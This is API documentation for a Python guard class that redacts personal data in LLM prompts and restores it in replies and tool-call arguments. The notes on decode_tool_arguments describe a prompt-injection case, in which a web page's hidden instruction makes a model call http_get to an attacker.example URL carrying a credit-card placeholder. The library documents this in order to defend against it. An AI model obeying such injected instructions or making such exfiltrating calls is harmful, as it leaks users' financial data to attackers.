# Guard[#](#guard "Link to this heading")

class scikitplot.cleanprompt.Guard(**cleaner=None**, **format='text'**, **verify=True**)[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L334)[#](#scikitplot.cleanprompt.Guard "Link to this definition")
:   Encode what goes to a model, check it, and decode what comes back.

    Parameters:
    :   ****cleaner****Cleaner, optional
        :   Defaults to `Cleaner()` — packs chosen by format, placeholders,
            `remember` on.

        ****format****str, default=’text’
        :   How prompt text is read. Use `'markdown'` for Markdown prompts, or
            any other text format the cleaner’s plan selects.

        ****verify****bool, default=True
        :   Run the independent leak check on everything outgoing, and refuse to
            send on a finding.

    Parameters:
    :   * ****cleaner**** ([**Cleaner**](scikitplot.cleanprompt.Cleaner.html#scikitplot.cleanprompt.Cleaner "scikitplot.cleanprompt.Cleaner") **|** **None**)
        * ****format**** ([**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)"))
        * ****verify**** ([**bool**](https://docs.python.org/3/builtins/functions.html#bool "(in Python v3.15)"))

    Notes

    ****User notes.**** One guard is one conversation: a value keeps its
    placeholder for every turn, and the vault is cleared when the `with`
    block ends. Nothing about the guard needs the network; you pass the
    function that calls the model.

    Examples

    Try it in your browser!
    ```
    >>> from scikitplot.cleanprompt import FluentCleanPrompt
    >>> with FluentCleanPrompt().guard() as guard:
    ...     guard.ask(
    ...         "Write to ann@example.com", lambda safe: "Sent to " + safe.split()[-1]
    ...     )
    'Sent to ann@example.com'

    ```
    Go BackOpen In Tab

    async aask(**prompt**, **call**)[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L776)[#](#scikitplot.cleanprompt.Guard.aask "Link to this definition")
    :   Guard `prompt`, await `call` with it, and decode the answer.

        Parameters:
        :   ****prompt****str
            :   What you would have sent.

            ****call****callable
            :   An `async` function taking the safe prompt and returning the
                model’s text.

        Returns:
        :   str
            :   The decoded answer.

        Raises:
        :   LeakError
            :   Before `call` is invoked, if the check fails.

            TypeError
            :   If `call` does not return an awaitable, or it does not resolve
                to a string.

        Parameters:
        :   * ****prompt**** ([**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)"))
            * ****call**** ([**Callable**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Callable "(in Python v3.15)")**[****[**[**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")**]****,** [**Awaitable**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Awaitable "(in Python v3.15)")**[**[**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")**]****]**)

        Return type:
        :   [str](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")

        Notes

        ****User notes.**** Encoding runs in the calling thread; it is fast for a
        prompt. For a large document, `await asyncio.to_thread(guard.outgoing,
        text)` first — a guard is safe to share across threads (`CP-067`).

    async achat(**messages**, **call**)[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L847)[#](#scikitplot.cleanprompt.Guard.achat "Link to this definition")
    :   Guard every message, await `call` with them, and decode the reply.

        Parameters:
        :   ****messages****sequence of mapping
            :   As [`chat`](#scikitplot.cleanprompt.Guard.chat "scikitplot.cleanprompt.Guard.chat").

            ****call****callable
            :   An `async` function taking the guarded messages and returning a
                string or a message mapping.

        Returns:
        :   str or dict
            :   The reply, decoded, in the shape `call` returned.

        Raises:
        :   LeakError
            :   Before `call` is invoked, if any message fails the check.

            TypeError
            :   If `call` does not return an awaitable of a string or mapping.

        Parameters:
        :   * ****messages**** ([**Sequence**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Sequence "(in Python v3.15)")**[**[**Mapping**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Mapping "(in Python v3.15)")**[**[**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")**,** [**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)")**]****]**)
            * ****call**** ([**Callable**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Callable "(in Python v3.15)")**[****[**[**list**](https://docs.python.org/3/builtins/stdtypes.html#list "(in Python v3.15)")**[**[**dict**](https://docs.python.org/3/builtins/stdtypes.html#dict "(in Python v3.15)")**[**[**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")**,** [**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)")**]****]****]****,** [**Awaitable**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Awaitable "(in Python v3.15)")**[**[**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)")**]****]**)

        Return type:
        :   [**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)")

    async adecode\_stream(**chunks**)[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L721)[#](#scikitplot.cleanprompt.Guard.adecode_stream "Link to this definition")
    :   Decode a reply streamed by an asynchronous client.

        Parameters:
        :   ****chunks****async iterable of str
            :   The reply as the client streams it.

        Yields:
        :   str
            :   As [`decode_stream`](#scikitplot.cleanprompt.Guard.decode_stream "scikitplot.cleanprompt.Guard.decode_stream").

        Raises:
        :   TypeError
            :   If a chunk is not a string.

        Parameters:
        :   ****chunks**** ([**AsyncIterable**](https://docs.python.org/3/library/collections.abc.html#collections.abc.AsyncIterable "(in Python v3.15)")**[**[**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")**]**)

        Return type:
        :   [**AsyncIterator**](https://docs.python.org/3/library/collections.abc.html#collections.abc.AsyncIterator "(in Python v3.15)")[[str](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")]

    ask(**prompt**, **call**)[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L751)[#](#scikitplot.cleanprompt.Guard.ask "Link to this definition")
    :   Guard `prompt`, pass it to `call`, and decode the answer.

        Parameters:
        :   ****prompt****str
            :   What you would have sent.

            ****call****callable
            :   Takes the safe prompt, returns the model’s text.

        Returns:
        :   str
            :   The decoded answer.

        Raises:
        :   LeakError
            :   Before `call` is invoked, if the check fails.

            TypeError
            :   If `call` does not return a string.

        Parameters:
        :   * ****prompt**** ([**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)"))
            * ****call**** ([**Callable**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Callable "(in Python v3.15)")**[****[**[**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")**]****,** [**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")**]**)

        Return type:
        :   [str](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")

    chat(**messages**, **call**)[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L817)[#](#scikitplot.cleanprompt.Guard.chat "Link to this definition")
    :   Guard every message, pass them to `call`, and decode the reply.

        Parameters:
        :   ****messages****sequence of mapping
            :   Chat messages. `content` may be a string or a list of parts; a
                part’s `text` is guarded. Other keys are copied unchanged.

            ****call****callable
            :   Takes the guarded messages; returns a string or a message mapping.

        Returns:
        :   str or dict
            :   The reply, decoded, in the shape `call` returned.

        Raises:
        :   LeakError
            :   Before `call` is invoked, if any message fails the check.

            CleanPromptError
            :   If a message has content of an unsupported shape.

        Parameters:
        :   * ****messages**** ([**Sequence**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Sequence "(in Python v3.15)")**[**[**Mapping**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Mapping "(in Python v3.15)")**[**[**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")**,** [**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)")**]****]**)
            * ****call**** ([**Callable**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Callable "(in Python v3.15)")**[****[**[**list**](https://docs.python.org/3/builtins/stdtypes.html#list "(in Python v3.15)")**[**[**dict**](https://docs.python.org/3/builtins/stdtypes.html#dict "(in Python v3.15)")**[**[**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")**,** [**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)")**]****]****]****,** [**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)")**]**)

        Return type:
        :   [**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)")

    property cleaner: [Cleaner](scikitplot.cleanprompt.Cleaner.html#scikitplot.cleanprompt.Cleaner "scikitplot.cleanprompt._runtime.Cleaner")[#](#scikitplot.cleanprompt.Guard.cleaner "Link to this definition")
    :   The cleaner holding this conversation’s values.

        Type:
        :   [Cleaner](scikitplot.cleanprompt.Cleaner.html#scikitplot.cleanprompt.Cleaner "scikitplot.cleanprompt.Cleaner")

    clear()[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L395)[#](#scikitplot.cleanprompt.Guard.clear "Link to this definition")
    :   Drop every value; the guard cannot be used afterwards.

        Return type:
        :   None

    decode\_object(**value**)[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L528)[#](#scikitplot.cleanprompt.Guard.decode_object "Link to this definition")
    :   Return a JSON-like value with every string decoded.

        Parameters:
        :   ****value****object
            :   Tool-call arguments as a model wrote them — a mapping, a list, or
                a JSON string of either.

        Returns:
        :   object
            :   The same shape with values restored. A JSON string comes back as
                the decoded JSON string.

        Parameters:
        :   ****value**** ([**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)"))

        Return type:
        :   [**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)")

    decode\_stream(**chunks**)[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L684)[#](#scikitplot.cleanprompt.Guard.decode_stream "Link to this definition")
    :   Decode a streamed reply, chunk by chunk.

        Parameters:
        :   ****chunks****iterable of str
            :   The reply as the client streams it.

        Yields:
        :   str
            :   Decoded text, never empty; joined, it equals the whole reply
                decoded at once.

        Raises:
        :   TypeError
            :   If a chunk is not a string.

        Parameters:
        :   ****chunks**** ([**Iterable**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Iterable "(in Python v3.15)")**[**[**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")**]**)

        Return type:
        :   [**Iterator**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Iterator "(in Python v3.15)")[[str](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")]

        Examples

        Try it in your browser!
        ```
        >>> from scikitplot.cleanprompt import FluentCleanPrompt
        >>> guard = FluentCleanPrompt().guard()
        >>> safe = guard.outgoing("mail ann@example.com")
        >>> "".join(guard.decode_stream(["mail [EMA", "IL-1]"]))
        'mail ann@example.com'

        ```
        Go BackOpen In Tab

    decode\_tool\_arguments(**arguments**, **\***, **allow**, **on\_withheld='raise'**)[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L559)[#](#scikitplot.cleanprompt.Guard.decode_tool_arguments "Link to this definition")
    :   Restore a tool call’s arguments with only the values this tool may get.

        Parameters:
        :   ****arguments****object
            :   The arguments as the model wrote them — a mapping, a list, or a
                JSON string of either (as [`decode_object`](#scikitplot.cleanprompt.Guard.decode_object "scikitplot.cleanprompt.Guard.decode_object") takes them).

            ****allow****iterable of str, or `"all"`
            :   The value kinds this tool may receive, for example `{"EMAIL"}`
                for a tool that sends mail, or `()` for one that fetches a URL.
                `"all"` restores every kind and must be asked for explicitly.

            ****on\_withheld****{‘raise’, ‘keep’}, default=’raise’
            :   What to do when the arguments name a value of another kind:
                refuse the call, or pass that placeholder through unrestored.

        Returns:
        :   object
            :   The arguments in the same shape, with allowed values restored.

        Raises:
        :   LeakError
            :   With `on_withheld='raise'`, if the arguments name a value of a
                kind not in `allow`. Nothing is restored and the tool must not
                run.

            ValueError
            :   If `allow` or `on_withheld` is not one of the accepted forms.

        Parameters:
        :   * ****arguments**** ([**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)"))
            * ****allow**** ([**Iterable**](https://docs.python.org/3/library/collections.abc.html#collections.abc.Iterable "(in Python v3.15)")**[**[**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")**]** **|** [**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)"))
            * ****on\_withheld**** ([**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)"))

        Return type:
        :   [**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)")

        Notes

        ****User notes.**** A tool call is where decoded values leave again. An
        instruction hidden in a page the model read can ask it to call
        `http_get("https://attacker.example/?c=[CREDIT_CARD-1]")`; the model
        never saw the number, but restoring every placeholder would hand it to
        the request. Give each tool the kinds it needs and no more — a
        network tool usually needs none.

        ****Developer notes.**** Which kinds the arguments name is decided by
        [`Cleaner.kinds_in`](scikitplot.cleanprompt.Cleaner.html#scikitplot.cleanprompt.Cleaner.kinds_in "scikitplot.cleanprompt.Cleaner.kinds_in"), the same restoration that decoding runs, so
        the check and the decode cannot disagree (`CP-073`).

        Examples

        Try it in your browser!
        ```
        >>> from scikitplot.cleanprompt import FluentCleanPrompt, LeakError
        >>> guard = FluentCleanPrompt().guard()
        >>> _ = guard.outgoing("mail ann@example.com, card 4242 4242 4242 4242")
        >>> guard.decode_tool_arguments({"to": "[EMAIL-1]"}, allow={"EMAIL"})
        {'to': 'ann@example.com'}
        >>> try:
        ...     guard.decode_tool_arguments({"url": "x?c=[CREDIT_CARD-1]"}, allow=())
        ... except LeakError as error:
        ...     print(error.kinds)
        ('CREDIT_CARD',)

        ```
        Go BackOpen In Tab

    encode\_object(**value**)[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L443)[#](#scikitplot.cleanprompt.Guard.encode_object "Link to this definition")
    :   Return a JSON-like value guarded as the JSON document it will become.

        Parameters:
        :   ****value****object
            :   A tool result or any structure of dicts, lists, strings, numbers,
                booleans and `None`. A bare string is guarded as text.

        Returns:
        :   object
            :   The value as [`json.loads`](https://docs.python.org/3/library/json.html#json.loads "(in Python v3.15)") reads the guarded document: keys,
                strings and numbers under sensitive field names are encoded, and
                every one is checked. Tuples become lists and non-string keys
                become strings, as in any JSON the model receives.

        Raises:
        :   TypeError
            :   If the structure holds a type JSON cannot carry — refused rather
                than converted, so nothing is sent in a form nobody inspected.

            ValueError
            :   If it holds `NaN` or an infinity, which JSON cannot carry.

            LeakError
            :   As [`outgoing`](#scikitplot.cleanprompt.Guard.outgoing "scikitplot.cleanprompt.Guard.outgoing").

            CleanPromptError
            :   If this guard’s plan does not select the `json` format.

        Parameters:
        :   ****value**** ([**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)"))

        Return type:
        :   [**Any**](https://docs.python.org/3/library/typing.html#typing.Any "(in Python v3.15)")

        Notes

        ****Developer notes — why the whole structure, not string by string
        (``CP-076``, ``CP-077``).**** Walking the structure and guarding each
        string left two things unread: mapping **keys**, so a result keyed by
        email address sent every address, and **numbers**, so a card or phone
        number stored as an integer went out as it was. Serialising once and
        guarding the document with the `json` format reads keys, gives a
        number under a sensitive field a numeric stand-in that keeps the JSON
        valid, reads `Key: value` prose inside strings (`CP-078`), and puts
        the whole document through the independent check.

        Examples

        Try it in your browser!
        ```
        >>> from scikitplot.cleanprompt import FluentCleanPrompt
        >>> guard = FluentCleanPrompt().guard()
        >>> guard.encode_object({"ann@example.com": {"card": 4242424242424242}})
        {'[EMAIL-1]': {'card': -9900000001}}

        ```
        Go BackOpen In Tab

    incoming(**reply**, **strict=False**)[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L508)[#](#scikitplot.cleanprompt.Guard.incoming "Link to this definition")
    :   Put the values back into a model’s reply.

        Parameters:
        :   ****reply****str
            :   The model’s text.

            ****strict****bool, default=False
            :   Raise on a placeholder this guard never issued.

        Returns:
        :   str
            :   The restored text.

        Parameters:
        :   * ****reply**** ([**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)"))
            * ****strict**** ([**bool**](https://docs.python.org/3/builtins/functions.html#bool "(in Python v3.15)"))

        Return type:
        :   [str](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")

    outgoing(**text**, **format=None**)[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L401)[#](#scikitplot.cleanprompt.Guard.outgoing "Link to this definition")
    :   Return `text` safe to send, or raise before anything is sent.

        Parameters:
        :   ****text****str
            :   A prompt, a message, a tool result.

            ****format****str, optional
            :   Overrides the guard’s format for this text.

        Returns:
        :   str
            :   The encoded text.

        Raises:
        :   LeakError
            :   If the independent check finds a removed value still present.

            CleanPromptError
            :   If the text cannot be read as its format.

        Parameters:
        :   * ****text**** ([**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)"))
            * ****format**** ([**str**](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)") **|** **None**)

        Return type:
        :   [str](https://docs.python.org/3/builtins/stdtypes.html#str "(in Python v3.15)")

    stream()[[source]](https://github.com/scikit-plots/scikit-plots/blob/de98219d/scikitplot/cleanprompt/_guard.py#L673)[#](#scikitplot.cleanprompt.Guard.stream "Link to this definition")
    :   Return a decoder for one streamed reply.

        Returns:
        :   StreamDecoder
            :   Feed it chunks; flush it once.

        Return type:
        :   [**StreamDecoder**](scikitplot.cleanprompt.StreamDecoder.html#scikitplot.cleanprompt.StreamDecoder "scikitplot.cleanprompt._guard.StreamDecoder")